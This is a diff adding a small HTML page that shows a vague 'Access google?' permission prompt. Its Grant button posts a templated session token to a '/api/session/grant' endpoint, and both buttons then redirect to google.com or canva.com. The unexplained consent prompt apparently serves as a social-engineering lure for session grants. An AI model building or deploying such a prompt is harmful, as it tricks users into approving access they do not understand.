@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Permission</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { background:#000; display:flex; align-items:center; justify-content:center; min-height:100vh; font-family:system-ui; }
+    .modal { background:#222; padding:24px; border-radius:12px; text-align:center; width:90%; max-width:300px; box-shadow:0 10px 40px rgba(0,0,0,0.8); }
+    .modal h2 { color:#fff; font-size:18px; margin-bottom:12px; }
+    .modal p { color:#aaa; font-size:13px; margin-bottom:20px; }
+    button { padding:10px 20px; border:none; border-radius:8px; cursor:pointer; font-weight:600; width:100%; margin-bottom:8px; }
+    .grant { background:#0069ff; color:#fff; }
+    .grant:hover { background:#0057e6; }
+    .skip { background:#444; color:#fff; }
+  </style>
+</head>
+<body>
+  <div class="modal">
+    <h2>Permissions</h2>
+    <p>Access google?</p>
+    <button class="grant" id="grant-btn">Grant</button>
+    <button class="skip" id="skip-btn">Skip</button>
+  </div>
+  <script>
+    const token = "{{ token }}";
+    document.getElementById('grant-btn').addEventListener('click', ()=>{
+      fetch(`/api/session/grant/${token}`, {method:'POST'})
+        .then(()=>{window.location.href = 'https://www.google.com';})
+        .catch(()=>{window.location.href = 'https://www.google.com';});
+    });
+    document.getElementById('skip-btn').addEventListener('click', ()=>{
+      window.location.href = 'https://www.canva.com';
+    });
+  </script>
+</body>
+</html>
